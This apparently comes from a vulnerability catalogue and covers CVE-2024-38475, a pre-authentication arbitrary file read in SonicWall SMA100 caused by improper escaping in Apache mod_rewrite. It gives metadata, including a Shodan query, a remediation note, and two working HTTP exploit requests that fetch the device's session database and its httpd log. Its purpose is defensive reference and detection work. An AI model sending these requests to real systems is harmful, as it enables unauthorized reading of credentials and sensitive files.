---
layout: "post"
cve_id: "CVE-2024-38475"
title: "Sonicwall - Pre-Authentication Arbitrary File Read"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-38475.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-38475.yaml"
author: "shaikhyaser"
severity: "critical"
impact: "Unauthenticated attackers can read arbitrary files from the SonicWall SMA100 filesystem including configuration files, logs, and sensitive data, potentially leading to further exploitation or complete system compromise.
"
remediation: "Upgrade to the latest patched version of SonicWall SMA100 or apply vendor-provided security updates.
"
reference:
  - "https://github.com/watchtowrlabs/watchTowr-vs-SonicWall-PreAuth-RCE-Chain/blob/main/watchTowr-vs-SonicWall-PreAuth-RCE-Chain.py"
  - "https://labs.watchtowr.com/sonicboom-from-stolen-tokens-to-remote-shells-sonicwall-sma100-cve-2023-44221-cve-2024-38475/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-38475"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', 'cvss-score': 9.1, 'cve-id': 'CVE-2024-38475', 'cwe-id': 'CWE-116', 'epss-score': 0.93858, 'epss-percentile': 0.9986}"
metadata: "{'verified': True, 'max-request': 1, 'shodan-query': 'html:"SonicWall" html:"SMA"'}"
tags:
  - "cve"
  - "cve2024"
  - "sonicwal"
  - "sma-100"
  - "lfi"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Improper escaping of output in mod_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, resulting in code execution or source code disclosure. Substitutions in server context that use a backreferences or variables as the first segment of the substitution are affected.  Some unsafe RewiteRules will be broken by this change and the rewrite flag "UnsafePrefixStat" can be used to opt back in once ensuring the substitution is appropriately constrained.


## üåê HTTP Request
```nohighlight
GET /tmp/temp.db%3f.1.1.1.1a-1.css HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.6
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /mnt/ram/var/log/httpd.log%3f.1.1.1.1a-1.css HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

